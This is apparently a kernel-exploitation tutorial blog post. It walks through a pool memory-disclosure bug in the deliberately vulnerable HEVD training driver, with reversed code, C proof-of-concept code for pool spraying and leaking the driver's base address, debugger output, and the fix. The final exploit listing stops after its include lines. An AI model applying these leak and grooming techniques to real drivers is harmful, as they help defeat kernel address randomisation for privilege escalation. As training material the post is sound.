---
title: HackSys Extreme Vulnerable Driver 3 - Memory Disclosure
date: 2022-06-11
tags: ["windows-kernel-exploitation"]
hide:
    - navigation
---

## Introduction

Over the next few posts we're going to heavily focus on the pool, as a result this post serves two purposes. The first purpose is to ascertain a basic understanding of the "Pool" prior to Windows RS5 (LFH) and the second is to get familiar with the pool under the direction of an exploit.

This post is a writeup of a NonPaged Pool Memory Disclosure in HackSys Extreme Vulnerable driver - we assume that you already have an environment setup to follow along. However, if you don't have an environment setup in this post we use:

- Windows 10 Pro x64 RS4
- HEVD 3.00

If you are not sure how to setup a kernel debugging environment you can find plenty of posts of the process online, we will not cover the process in this post.

If you have not read my previous posts on HackSys Extreme Vulnerable Driver then I'd highly recommend you do so. Although the vulnerabilities there are not particularly related to this post, if you're newer to kernel exploitation specifically on Windows then the previous posts will be useful particularly the classic stack buffer overflow.

# NonPaged Pool Memory Disclosure

In this post we're going to explore a memory disclosure primitive in a function which allocates on the NonPaged Pool. Although the primitive itself is fairly simple it will give us the context required to go further with exploiting more complex primitives featuring the pool in future posts. In short, this post serves as a foundation for developing an understanding of the Windows Pool pre-LFH.

???+ NOTE
    In later posts we will explore this content again in a post-LFH world. Although pre-LFH is not as relevant now, it serves as a great foundation. I wanted the content to remain semi-relevant to real-life hence why we're on Windows 10 x64 and not x86.

# Memory Pool

The "Pool" is the heap reserved specifically for kernel-land on Windows, i.e, its a fancy term for the kernels heap. In previous releases of Windows the Pool allocator has been specific and different from the allocator that existed in user-land. However as of the 19H1 Windows 10 release this has changed and the well documented Segmeant Heap from user-land has been brought into the kernel. In this post we will be exploring the old pool, i.e, we won't be looking at the Segment Heap internals since we're on RS4 and as mentioned the Segment Heap from user-land was not brought into the kernel until 19H1.

???+ note 
    As a quick aside the reason why I am not looking at the Segment Heap implementation is because I've never interacted with the Pool prior to this post so we're starting somewhat at the beginning. You might be wondering why I am not doing this on Windows 7 x86 in that case and the reason is simple - there's a million posts on that, you won't learn anything new from me on those builds. But you might on Windows 10 x64.

The kernel pools are divided into four distinct types which are held in the `_POOL_DESCRIPTOR` structure with a type of `POOL_TYPE`:

- Paged
- NonPaged
- NonPagedNx
- Session

The **Pool Descriptor** keeps information on the current state of the pool including the pool type as mentioned, its typedef can be seen below.

```C
typedef struct _POOL_DESCRIPTOR {
	POOL_TYPE  PoolType;
	ULONG      PoolIndex;
	ULONG      RunningAllocs;
	ULONG      RunningDeAllocs;
	ULONG      TotalPages;
	ULONG      TotalBigPages;
	ULONG      Threshold;
	PVOID      LockAddress;
	LIST_ENTRY ListHeads[POOL_LIST_HEADS];
	
} POOL_DESCRIPTOR; *PPOOL_DESCRIPTOR*;
```

Each allocation is identified using a **Pool Tag** which is a four-byte character array that is specified by the driver when it allocates the memory using a call to `ExAllocatePoolWithTag`. The Pool Tag can ultimately be anything as long as each character is ASCII.

In essence the pool is simply just a list of allocated memory pages. Each page is 0x1000 bytes in size and is fragmented in chunks. Chunks can be different sizes however in our case we'll only focus on chunks smaller than 0xFF1 bytes. Below is the structure of a pool chunk:

```
   |---------------------------------------------------|
0  | PreviousSize | PoolIndex | Block Size | Pool Type |
4  |---------------------------------------------------|
   |                      Pool Tag                     |
8  |---------------------------------------------------|
   |                                                   |
   |                   Process Billed                  |
   |                                                   |
16 |---------------------------------------------------|
   |                                                   |
   |                                                   |
   |                       Data                        |
   |                                                   |
   |                                                   |
   |---------------------------------------------------|
```

As noted the primary API for pool allocations is `ExAllocatePoolWithTag`. The prototype for `ExAllocatePoolWithTag` can be seen below:

```C
PVOID ExAllocatePoolWithTag(
	POOL_TYPE   PoolType,
	SIZE_T      NumberOfBytes,
	ULONG       Tag
);
```

Drawing a comparison between user-land and kernel-land for a second, in user-land developers have the default process heap to allocate chunks from. Alternatively they can create their own private heaps. The Windows Pool is different as the system predefines the pools for servicing requests in the kernel, i.e, through pool types which have distinct properties.

We won't be talking about the Paged or Session Pool here as these are out of scope for this post. Instead we will focus on the NonPagedNx Pool. We could talk in much more detail about the pool however this is ultimately out of the scope of this post.

## NonPagedNx Pool

Since Windows 8 a new pool type called the NonPagedNx pool was released, although it operates on the same paging principle as the original NonPaged Pool it has some additional security properties the most obvious one being "Non-eXecutable" (NX). In a later post we will exploit a pool overflow in the NonPagedNx pool but for now we're going to swim in the shallow end and build a basic understanding that we can leverage in future posts for more cool hax.

<hr>

# Reversing the Driver

As in previous posts the `IrpDeviceIoCtlHandler` is located at `sub_140085078`. To find the vulnerable functions IOCTL handler we can just do a string search for the words "Memory Disclosure" which should take us to the address `loc_140085487` which has the IOCTL handler for the vulnerable NonPagedPoolNx Memory Disclosure function.

## Locating the IOCTL Handler

At `IrpDeviceIoCtlHandler+42E` is a call to the IOCTL handler which we'll rename to `MemoryDisclosureNonPagedPoolNxIoctlHandler`.

## Reversing the Vulnerable Function

Inside `MemoryDisclosureNonPagedPoolNxIoctlHandler` at `MemoryDisclosureNonPagedPoolNxIoctlHandler+15` there is a call to the trigger of the vulnerable function, we'll rename this to `TriggerMemoryDisclosureNonPagedPoolNx`. Let's open the function in IDA.

???+ hint
    The below decompilation has been cleaned up and modified so your IDA output won't be identical!

```C title="Vulnerable Function"
TriggerMemoryDisclosureNonPagedPoolNx(volatile void *UserBuffer, SIZE_T UserSize)
{
  PVOID KernelBuffer;
  int64 result;

  DbgPrintEx(0x4D, 3, "[+] Allocating Pool chunk\n");
  KernelBuffer = ExAllocatePoolWithTag((POOL_TYPE)512, 0x1F8, 0x6B636148);

  if ( KernelBuffer )
  {
    DbgPrintEx(0x4D, 3, "[+] Pool Tag: %s\n", "'kcaH'");
    DbgPrintEx(0x4D, 3, "[+] Pool Type: %s\n", "NonPagedPoolNx");
    DbgPrintEx(0x4D, 3, "[+] Pool Size: 0x%X\n", 504);
    DbgPrintEx(0x4D, 3, "[+] Pool Chunk: 0x%p\n", KernelBuffer);

    memset(KernelBuffer, 65, 0x1F8);
    ProbeForWrite(UserBuffer, 0x1F8, 1);

    DbgPrintEx(0x4D, 3, "[+] UserOutputBuffer: 0x%p\n", UserBuffer);
    DbgPrintEx(0x4D, 3, "[+] UserOutputBuffer Size: 0x%X\n", UserSize);
    DbgPrintEx(0x4D, 3, "[+] KernelBuffer: 0x%p\n", KernelBuffer);
    DbgPrintEx(0x4D, 3, "[+] KernelBuffer Size: 0x%X\n", 504);
    DbgPrintEx(0x4D, 3, "[+] Triggering Memory Disclosure in NonPagedPoolNx\n");

    RtlCopyMemory(UserBuffer, KernelBuffer, UserSize);

    DbgPrintEx(0x4D, 3, "[+] Freeing Pool chunk\n");
    DbgPrintEx(0x4D, 3, "[+] Pool Tag: %s\n", "'kcaH'");
    DbgPrintEx(0x4D, 3, "[+] Pool Chunk: 0x%p\n", KernelBuffer);
    ExFreePoolWithTag(KernelBuffer, 0x6B636148);
    result = 0;
  }
  else
  {
    DbgPrintEx(0x4D, 3, "[-] Unable to allocate Pool chunk\n");
    result = 3221225495;
  }
  return result;
}
```

Starting from the top of the function we can see that there's a pool allocation through the `ExAllocatePoolWithTag` function which passes three parameters:

1. A `POOL_TYPE` of 512 (which is NonPagedPoolNx)
2. A size of the allocation which is `0x1F8` 
3. A Pool tag which is represented in hex `0x6B636148`

Based on the print statements following the allocation we know that the final argument in the call to `ExAllocatePoolWithTag` is `kcaH` which is `Hack` reversed.

Moving down the function we can see there's a call to `memset()` which sets the allocated Pool buffer to be filled with `65` which is `0x41` in hex (`A` characters). And that memset uses the same size that was used for the total allocation, i.e, it sets the entire allocated buffer to be filled with `A`.

Directly after the call to `memset()` there is a call to `ProbeForWrite()` which we know from previous posts does a write from a user-mode buffer stored at `Address`. We can see that the write uses the same size that was used for the pool buffer, so far no vulnerabilities here.

If we move down past the prints we can see there's a call to `RtlCopyMemory` (`memcpy`) which copies the contents of the allocated pool buffer into the user-mode address. The final argument is the size argument and here is where the problem is. If we look at the top of the function we can see that `TriggerMemoryDisclosureNonPagedPoolNx` takes two arguments, a pointer to a user-mode buffer and a `SIZE_T` arugment (which is also controlled by us.) Then when we get to the `RtlCopyMemory` instead of using the same size that was used to allocate the pool buffer, it uses the size specified by the user in the call to `TriggerMemoryDisclosureNonPagedPoolNx`. **This is a classic information leak vulnerability.**

Since we control the size parameter for the copy, we can leak data from adjacent pool chunks which can include kernel addresess and more.

<hr>

# Dynamic Analysis

Now that we've done some static analysis let's set a breakpoint on `TriggerMemoryDisclosureNonPagedPoolNx` in WinDbg and step through the function to confirm the behaviour that we've seen so far. 

## Interacting with the Driver

To aid the dynamic analysis process we'll create a simple program to interact with the driver. Most of this code will be familiar to you from previous posts so I won't explain all of it here again.

```C title="Simple Interaction Program"
#include <Windows.h>
#include <stdio.h>
#include <Psapi.h>

#define DRIVER "\\\\.\\HacksysExtremeVulnerableDriver"
#define IOCTL_CODE 0x0022204f

/* Function to open a handle to the driver */
HANDLE OpenDriverHandle()
{
    HANDLE DriverHandle = NULL;

    /* Opens handle to driver */
    DriverHandle = CreateFileA(DRIVER, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (DriverHandle == INVALID_HANDLE_VALUE) // If handle cant open, exit.
    {
        printf("\t[!] FATAL: Failed to open driver handle!\n");
        exit(-1);
    }
    else
    {
        printf("\t[+] Opened Driver Handle: 0x%x\n", DriverHandle);
        return DriverHandle; // Return handle to driver to be used later.
    }
}

void exploit(HANDLE DriverHandle)
{

    DWORD   BytesReturned;
    BYTE    OutputBuffer[0x1F8] = {0};

    /* Issue IOCTL */
    printf("[*] Sending IOCTL to driver!\n");
    if (!DeviceIoControl(DriverHandle, IOCTL_CODE, NULL, 0, &OutputBuffer, 0x1F8, &BytesReturned, NULL)) // (1)
    {
        printf("[!] FATAL: Error sending IOCTL to driver!\n");
        return;
    }

    printf("[+] Kernel Allocation Contents: ");
    for (int i = 0; i <= 0x1F8; i++)
    {
        printf("%x", OutputBuffer[i]);
    }

}

int main()
{
    printf("[+] HEVD: NonPagedPoolNx Memory Disclosure!\n");

    printf("[*] Opening handle to the driver!\n");
    HANDLE DriverHandle = OpenDriverHandle();

    exploit(DriverHandle);
}
```

1. Notice how we use `lpOutBuffer` and `nOutBufferSize` here since we're doing a `read()` rather than a `write()`.

The important thing to take note of here is the call to `DeviceIoControl` before moving onwards with our analysis let's quickly take a look at the [prototype from MSDN](https://docs.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol).

```C++ title="DeviceIoControl Prototype"
BOOL DeviceIoControl(
  [in]                HANDLE       hDevice,
  [in]                DWORD        dwIoControlCode,
  [in, optional]      LPVOID       lpInBuffer,
  [in]                DWORD        nInBufferSize,
  [out, optional]     LPVOID       lpOutBuffer,
  [in]                DWORD        nOutBufferSize,
  [out, optional]     LPDWORD      lpBytesReturned,
  [in, out, optional] LPOVERLAPPED lpOverlapped
);
```

In previous posts we've heavily used the `lpInBuffer` and `nInBufferSize` arguments whereas for this exploit we're actually going to need to use the `lpOutBuffer` and `nOutBufferSize` arguments, which you can see in our above simple program. If we compile and run the code we should see some output like shown below.

```title="Basic POC"
C:\Users\admin\Desktop>NonPagedPoolNxMemoryDisclosure.exe
[+] HEVD: NonPagedPoolNx Memory Disclosure!
[*] Opening handle to the driver!
        [+] Opened Driver Handle: 0x7c
[*] Sending IOCTL to driver!
[+] Kernel Allocation Contents: 4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141410
```

As you can clearly see, we are able to read data from the allocated kernel buffer since we're receiving the `A` characters which we know are the result of a `memset()` the function does.

# Exploitation

Exploitation of this vulnerability is fairly simple, we can make a request for more data than the allocated pool chunk of 0x1F8 has. Let's make a minor modification to our exploit code and request 0x1F8 * 2 which is 0x3F0. You can find the changes to the POC below.

```C title="Exploit Attempt"

void exploit(HANDLE DriverHandle)
{

    DWORD   BytesReturned;
    BYTE    OutputBuffer[0x3F0] = {0};

    /* Issue IOCTL */
    printf("[*] Sending IOCTL to driver!\n");
    if (!DeviceIoControl(DriverHandle, IOCTL_CODE, NULL, 0, &OutputBuffer, 0x3F0, &BytesReturned, NULL))
    {
        printf("[!] FATAL: Error sending IOCTL to driver!\n");
        return;
    }

    printf("[+] Kernel Allocation Contents: ");
    for (int i = 0; i <= 0x3F0; i++)
    {
        printf("%x", OutputBuffer[i]);
    }

}
```

???+ hint
    The `A` characters have been removed from the output below for brevity.


```title="Leaking Data :smile:"
C:\Users\admin\Desktop>NonPagedPoolNxMemoryDisclosure.exe
[+] HEVD: NonPagedPoolNx Memory Disclosure!
[*] Opening handle to the driver!
        [+] Opened Driver Handle: 0x7c
[*] Sending IOCTL to driver!
[+] Kernel Allocation Contents: 0000000021019246696c6572bc4a5ecf769d45889afeae689ffff4899feae689ffff04008010000000000000000006099feae689ffff000000000000689ffff10000000000000000000000006f04c401100405c47853f8ffff0000000050d80000070ec4dac689ffffe0b64dac689ffff904617ba8daefffff04817ba8daeffffc8e0f8ae689ffff0000000000000000000000000010010042404000005207800000a0bbc6b98daeffff00000000000000000000000010600000389afeae689ffff389afeae689ffff00600000509afeae689ffff509afeae689ffff0000000000000000709afeae689ffff709afeae689ffff000000000000000000000000000000001000000000000000000000000000000019019246696c6582bf4a5ecf769d45189cfeae689fffff08d50ac689ffffd8000801000000000000000000000000000000000000000000210000000000000000
```

As you can see in the above output, it is pretty clear that we are able to leak arbitrary data from adjacent pool chunks. The next step though is how we turn this data into something useful.

## Leaking Driver Addresses

Our current POC is simply leaking data from the adjacent pool chunks, while this could certainly be useful there is more we can do with this. For starters, it would be nice to leak the base address of the driver. We should be able to do this very easily.

In order to leak addresses we actually want such as the base address of HEVD for example, we're going to need to carry out the process of "pool grooming". All this term really means is; *getting the pool into a state which is desirable to us, the attacker.* Pool grooming is a very well understood concept and there's a number of ways we can approach it. The most common way to perform grooming of the pool is to do lots of allocations of Kernel Objects such as the Event Object for example. With that in mind, let's go ahead and create a new function in our POC to spray some Kernel Objects.

```C title="Pool Spray Function"
void PoolSpray()
{
    HANDLE  EventObjects[10000] = {0};

    for (int i = 0; i <= 10000; i++)
    {
        HANDLE EventHandle = CreateEventA(NULL, FALSE, FALSE, NULL);

        EventObjects[i] = EventHandle;
    }
}
```

The above function is a very simple pool spray which we can use to fulfil our goal of grooming the pool. We create an array called `EventObjects` which can store 10,000 event object handles. Then inside a for loop we create 10,000 event objects. Finally we make sure to pass those returned handles to our array so that we can use them later.

### Inspecting the Pool

With the new function we just created, let's set a breakpoint after the pool allocation and inspect the state of the pool.

```
0: kd> bp HEVD!TriggerMemoryDisclosureNonPagedPoolNx+59
0: kd> g

Breakpoint 1 hit
HEVD!TriggerMemoryDisclosureNonPagedPoolNx+0x59:
fffff800`4a8c6f5d 488bf8          mov     rdi,rax

0: kd> r
rax=ffff8700c6f662c0 rbx=0000000000000000 rcx=0000000000000010
rdx=0000000000000bd7 rsi=00000086857ff260 rdi=000000000000004d
rip=fffff8004a8c6f5d rsp=fffff90f1ae82760 rbp=ffff8700c61d27f0
 r8=ffff8700c3600000  r9=0000000000000000 r10=000000006b636148
r11=0000000000001001 r12=000000000000004d r13=00000000000001f8
r14=00000000000003f0 r15=0000000000000003
iopl=0         nv up ei ng nz na pe nc
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
HEVD!TriggerMemoryDisclosureNonPagedPoolNx+0x59:
fffff800`4a8c6f5d 488bf8          mov     rdi,rax
```

What we should see is that our sprayed objects are filling the pool. We can use the `!poolused` command in order to find the number of allocations of specific events in this case we're interested in Events which can be found via their `POOL_TAG` of `Even`.

```
0: kd> !poolused 2 Even

               NonPaged                  Paged
 Tag     Allocs         Used     Allocs         Used

 Even     19248      2470752          0            0	Event objects 

TOTAL     19248      2470752          0            0

```

As you can see in the above, we've successfully managed to allocate some objects in the NonPaged Pool of our choosing. The address of the pool allocation is returned in `RAX` and we can use the `!pool` command to inspect that pool page.

```
0: kd> !pool ffff8700c6f662c0
Pool page ffff8700c6f662c0 region is Nonpaged pool
 ffff8700c6f66000 size:   80 previous size:    0  (Allocated)  Even
 ffff8700c6f66080 size:  230 previous size:   80  (Free)       Free
*ffff8700c6f662b0 size:  210 previous size:  230  (Allocated) *Hack
		Owning component : Unknown (update pooltag.txt)
 ffff8700c6f664c0 size:   80 previous size:  210  (Free )  Io  
 ffff8700c6f66540 size:   80 previous size:   80  (Allocated)  Even
 ffff8700c6f665e0 size:   80 previous size:   80  (Allocated)  Even
 ffff8700c6f66660 size:   80 previous size:   80  (Allocated)  Even
 ffff8700c6f66700 size:   80 previous size:   80  (Allocated)  Even
 ffff8700c6f66780 size:   80 previous size:   80  (Allocated)  Even
 ffff8700c6f66820 size:   80 previous size:   80  (Allocated)  Even
 ffff8700c6f668a0 size:   80 previous size:   80  (Allocated)  Even
 ffff8700c6f66940 size:   80 previous size:   80  (Allocated)  Even
 ffff8700c6f669c0 size:   80 previous size:   80  (Allocated)  Even
 ffff8700c6f66a60 size:   80 previous size:   80  (Allocated)  Even
 ffff8700c6f66ae0 size:   80 previous size:   80  (Allocated)  Even
 ffff8700c6f66b80 size:   80 previous size:   80  (Allocated)  Even
 ffff8700c6f66c00 size:   80 previous size:   80  (Allocated)  Even
 ffff8700c6f66ca0 size:   80 previous size:   80  (Allocated)  Even
 ffff8700c6f66d20 size:   80 previous size:   80  (Allocated)  Even
 ffff8700c6f66dc0 size:   80 previous size:   80  (Allocated)  Even
 ffff8700c6f66e40 size:   80 previous size:   80  (Allocated)  Even
 ffff8700c6f66ee0 size:   80 previous size:   80  (Allocated)  Even
 ffff8700c6f66f60 size:   80 previous size:   80  (Allocated)  Even
```

As you can see our objects are clearly present and between our allocations of objects. Remember the primitive is that we can read data from adjacent pool chunks. In the above, the chunk next to ours is actually in a free state, i.e, we don't control this chunk. But the subsequent chunks we do. In order to read the data we desire, we need to make sure that the adjacent pool chunks are filled with data which we control. 

Now that we are able to control the pool page to a reliable degree we can begin our next task. As stated previously our goal is to leak addresses which we can use for future payloads such as when we need to bypass KASLR if we're in a low integrity environment. With the memory disclosure we currently have we're not leaking anything that useful. Now that we can control the pool page though we can leak something more interesting.

If we zoom out for a bit and take a look at some of the available functions in HEVD we'll notice that there are some functions which are designed to allocate objects in the NonPagedNx Pool. This is ideal because we can use these objects in our pool spray so that when we execute our read primitive we're actually reading an object created by the driver which should give us an address inside the driver itself which we can then use to calculate the base address of the driver.

???+ attention
    It is worth noting here that this primitive isn't entirely realistic. There would be some differences with a real driver but for the most part it is accurate.

### Leaking a Function Pointer

The above explanation was a bit of a word salad so lets break it down. Our goal is to leak an address which we can use in further exploitation, ideally it would be nice to have a primitive to get the base address of HEVD. HEVD comes with some "helper" functions which are specifically created to help with exploitation of some of the other exploit primitives.

These "helper" functions allocate objects in the NonPagedNx Pool to be used for exploitation of other vulnerabilities in HEVD. For example, there is a function to allocate a fake object in the NonPagedPoolNx for the UaF primitive this function is called `AllocateUaFObjectNonPagedPoolNx`. This function is very simple, it does an allocation similar to the one that we observed in our vulnerable function. So how can we use it?

At the moment we have control of the pool, we can allocate objects sequentially without an issue which gives us reliable control over the pool. However, in order to get an address we can actually use for further exploitation we'll need to adapt our payload. Since we have a function which is able to make an allocation in the NonPagedNx Pool we can use this function to leak an address from HEVD. If we perform our standard pool spray but then issue an IOCTL to the `AllocateUaFObjectNonPagedPoolNx` function, that function will create an object in the NonPagedNx Pool. If we can make it such that the allocated object lands between our sprayed objects we'll then be able to use our leak primitive to leak addresses from the chunk created by `AllocateUaFObjectNonPagedPoolNx` which should allow us to calculate the base address of HEVD.

We'll modify our existing spray and add a `DeviceIoControl` to call the `AllocateUaFObjectNonPagedPoolNx` function during our spray. What should happen is that objects from that function should land after every single Event Object.

```C
#define IOCTL_UAF 0x00222053

void PoolSpray(DriverHandle)
{
    HANDLE  EventObjects[10000] = {0};
    DWORD   BytesReturned;

    for (int i = 0; i <= 10000; i++)
    {
        HANDLE EventHandle = CreateEventA(NULL, FALSE, FALSE, NULL);

        DeviceIoControl(DriverHandle, IOCTL_UAF, NULL, 0, NULL, 0, &BytesReturned, NULL);

        EventObjects[i] = EventHandle;
    }

}
```

Let's now run our updated payload and inspect the state of the pool. We'll use the same breakpoint we used previously and then get the pool address from the `RAX` register.

```
1: kd> !pool ffff8700c77278c0
Pool page ffff8700c77278c0 region is Nonpaged pool
 ffff8700c7727000 size:   70 previous size:    0  (Allocated)  Hack
 ffff8700c7727070 size:  840 previous size:   70  (Free)       Free
*ffff8700c77278b0 size:  210 previous size:  840  (Allocated) *Hack
		Owning component : Unknown (update pooltag.txt)
 ffff8700c7727ac0 size:   80 previous size:  210  (Free )  Io  
 ffff8700c7727b40 size:   80 previous size:   80  (Free )  Io  
 ffff8700c7727bc0 size:   80 previous size:   80  (Allocated)  Io   Process: ffff8700c6f2e580
 ffff8700c7727c40 size:   70 previous size:   80  (Allocated)  Hack
 ffff8700c7727cb0 size:   80 previous size:   70  (Allocated)  Even
 ffff8700c7727d30 size:   70 previous size:   80  (Allocated)  Hack
 ffff8700c7727da0 size:   80 previous size:   70  (Allocated)  Even
 ffff8700c7727e20 size:   70 previous size:   80  (Allocated)  Hack
 ffff8700c7727e90 size:   80 previous size:   70  (Allocated)  Even
 ffff8700c7727f10 size:   70 previous size:   80  (Allocated)  Hack
 ffff8700c7727f80 size:   80 previous size:   70  (Allocated)  Even

```

As you can clearly see, after every event object we have a `Hack` object as well, this is perfect. We can now use our arbitrary size information leak to leak addresses from the adjacent chunks. What we'd like to do next is replace those created `Even` objects with the vulnerable object that features the out-of-bounds read. The desired end result of the pool looks like this.

```
VULN_OBJ | UAF_OBJ | VULN_OBJ | UAF_OBJ | [...]
```

To achieve this goal we can make some minor modifications to our existing payload. We'll need to free our Event Objects so that our pool structure looks like below:


```
FREE | UAF_OBJ | FREE | UAF_OBJ | [...]
```

We can simply issue a call to `CloseHandle()` on all of the event objects because almost immediately after we'll begin spraying the vulnerable objects and at least **one** of them should be adjacent to a `Hack` chunk thus giving us our read primitive.

```C title="Freeing the Event Objects"

    /* Free event objects */
    for (int i = 0; i <= 5000; i++)
    {
        CloseHandle(EventObjects[i]);
        EventObjects[i] = NULL;
    }
```

With those objects being freed we can go ahead and spray 100 of our vulnerable objects, this is a simple case of creating a loop in our `exploit()` function. The reason why we're not going to replace all of the Event objects with vulnerable objects is because we need to ensure that we don't try and read too far out-of-bounds because that could cause a page fault which will generate a BSOD. Also, 100 vulnerable objects should be enough to get a reliable leak.

```C title="Spray 100 vulnerable objects"
void exploit(HANDLE DriverHandle)
{

    DWORD           BytesReturned;
    char            OutputBuffer[0x270] = {0};
    ULONGLONG       HevdBaseAddress;

    printf("[+] Starting pool spray!\n");
    for (int i = 0; i <= 100; i++)
    {
        PoolSpray(DriverHandle);
        DeviceIoControl(DriverHandle, IOCTL_CODE, NULL, 0, &OutputBuffer, sizeof(OutputBuffer), &BytesReturned, NULL);
    }
}
```

If we run the code above we're going to get a lot of junk data out that has no relation at all to our target object. We'll get lots of addresses which are not useful to us at all. 

## Improving Reliability

As with any exploit the goal is reliability, this is especially important with information leaks because we want to be sure the address we are leaking is the address we think it is. Unfortunately, we're fighting the allocator here a little, but we can account for that in our POC. We can't guarantee with 100% certaintity that we will leak the call back address in the HEVD UAF helper function every time, but we can implement some checks so that our leak runs **until** we're sure we've found it.

To do this we can implement some simple checks into our spray which can verify some of the received leaked data. Particularly we can do two things:

1. Check for the presence of the `Hack` pool tag.
2. Verify the leaked address is a kernel address.

The first check is more reliable than the latter check, so we'll perform that check first and once we confirm the pool tag is present in the received data, we'll check for kernel addresses. When we leak data we'll be leaking the pool chunks header which contains the pool tag. By checking the leaked data for the presence of the pool tag we know is used in the UaF helper object we can confirm that the leak on that iteration did in-fact leak a chunk belonging to the driver.

```C
void exploit(HANDLE DriverHandle)
{
    DWORD           BytesReturned;
    char            OutputBuffer[0x270] = {0};
    ULONGLONG       HevdBaseAddress;

    char search[5] = "Hack";
    int pos_search = 0;
    int pos_text = 0;
    int len_search = 4;
    int len_text = 0x270;
    BOOL Match = FALSE;

    printf("[+] Starting pool spray!\n");
    for (int i = 0; i <= 100; i++)
    {
        PoolSpray(DriverHandle);
        DeviceIoControl(DriverHandle, IOCTL_CODE, NULL, 0, &OutputBuffer, sizeof(OutputBuffer), &BytesReturned, NULL);

        for (pos_text = 0; pos_text < len_text - len_search; ++pos_text)
        {
            if (OutputBuffer[pos_text] == search[pos_search])
            {
                ++pos_search;
                if (pos_search == len_search)
                {
                    printf("\t[!] Match from %d to %d\n", pos_text-len_search, pos_text);
                    Match = TRUE;
                    break;
                }
            }
            else
            {
                pos_text -= pos_search;
                pos_search = 0;
            }
        }

        if (Match == TRUE)
        {
            for (int i = 0; i <= 0x270; i++)
            {
                unsigned long long *UOutputBuffer;
                UOutputBuffer = (unsigned long long *)OutputBuffer;
                //printf("0x%llx\n", UOutputBuffer[i]);

                /* Check if we leaked kernel address */
                if ((UOutputBuffer[i] & 0xfffff00000000000) == 0xfffff00000000000)
                {
                    printf("\t[+] Address of HEVD!UaFObjectCallback: 0x%llx\n", UOutputBuffer[i]);
                    printf("\t[+] Base Address of HEVD: 0x%llx\n", UOutputBuffer[i] - 0x880C0);

                    // 0: kd> ? 0xfffff8051b3880c0 - HEVD
                    // Evaluate expression: 557248 = 00000000`000880c0
                    HevdBaseAddress = UOutputBuffer[i] + 0x880C0;
                    break;
                }
            }
            break;
        }
    }
    printf("[*] Closing handle!\n");
    CloseHandle(DriverHandle);
```

The code probably looks quite daunting so I'll do my best to explain it. From a high level it is quite simple. We spray the pool with 100 of the vulnerable chunks that we're able to perform the out-of-bounds read with. We'll then iterate over the received buffer and search for the string "Hack", if we find this string then we'll loop over all of the characters in the array and we'll check if they are compliant with the kernel address format, if they are since the pool tag was found we can be sure that we found the an address inside HEVD and we can then calculate the base address.

If you're unfamiliar with C I would suggest taking a great deal of care to read over the code and understand what exactly we're doing. Or you could just use Python because it has the `in()` function which is much easier... If you're really stuck with understanding the above code specifically iterating over the character array, I got most of that from [this stackoverflow post](https://stackoverflow.com/questions/13450809/how-to-search-a-string-in-a-char-array-in-c).

## Final Result

As you can see in the above code block all our effort paid off and we're now able to leak the base address of HEVD. It is worth noting that it won't leak every time, you may have to run the code more than once. This could easily be solved by changing the loop logic but I won't bother with that in this post. 90% of the time you'll get the base address within 1 or 2 executions of the exploit.

```
0: kd> lm m hevd
Browse full module list
start             end                 module name
fffff800`c46e0000 fffff800`c476c000   HEVD       (deferred)             

Unable to enumerate user-mode unloaded modules, Win32 error 0n30

C:\Users\admin\Desktop>NonPagedPoolNxMemoryDisclosure.exe
[+] HEVD: NonPagedPoolNx Memory Disclosure!
[*] Opening handle to the driver!
        [+] Opened Driver Handle: 0x80
[+] Starting pool spray!
    [!] Match from 515 to 519
    [+] Address of HEVD!UaFObjectCallback: 0xfffff800c47680c0
    [+] Base Address of HEVD: 0xfffff800c46e0000
```

<hr>

# Fix

Fixing the vulnerability is pretty simple. Instead of doing a read with the size specified by the user, the read is instead done with the size which is specified for the allocation itself. That way the read is only ever the same size as the allocated chunk. Below is a cleaned up output of the fixed version from the [HEVD source](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/MemoryDisclosureNonPagedPoolNx.c).

```C title="Patched Vulnerability"
        DbgPrint("[+] Allocating Pool chunk\n");

        KernelBuffer = ExAllocatePoolWithTag(
            NonPagedPoolNx,
            (SIZE_T)POOL_BUFFER_SIZE,
            (ULONG)POOL_TAG
        );

        if (!KernelBuffer)
        {
            //
            // Unable to allocate Pool chunk
            //
            DbgPrint("[-] Unable to allocate Pool chunk\n");

            Status = STATUS_NO_MEMORY;
            return Status;
        }
        else
        {
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Type: %s\n", STRINGIFY(NonPagedPoolNx));
            DbgPrint("[+] Pool Size: 0x%zX\n", (SIZE_T)POOL_BUFFER_SIZE);
            DbgPrint("[+] Pool Chunk: 0x%p\n", KernelBuffer);
        }

        RtlFillMemory(KernelBuffer, (SIZE_T)POOL_BUFFER_SIZE, 0x41);

        ProbeForWrite(UserOutputBuffer, (SIZE_T)POOL_BUFFER_SIZE, (ULONG)__alignof(UCHAR));

        DbgPrint("[+] UserOutputBuffer: 0x%p\n", UserOutputBuffer);
        DbgPrint("[+] UserOutputBuffer Size: 0x%zX\n", Size);
        DbgPrint("[+] KernelBuffer: 0x%p\n", KernelBuffer);
        DbgPrint("[+] KernelBuffer Size: 0x%zX\n", (SIZE_T)POOL_BUFFER_SIZE);

        // Secure Note: This is secure because the developer is passing a size
        // equal to size of the allocated Pool chunk to RtlCopyMemory()/memcpy().
        // Hence, there will be no out of bound read of kernel mode memory

        RtlCopyMemory(UserOutputBuffer, KernelBuffer, (SIZE_T)POOL_BUFFER_SIZE); // (1)
```

1. The copy here uses the size of the allocated pool buffer, not a size specified from user-mode.

<hr>

# Full Exploit

Thanks for reading, I hope you enjoyed! You can find my full proof of concept below.

```C
#include <Windows.h>
#include <stdio.h>
#include <Psapi.h>
#include <stdlib.h>

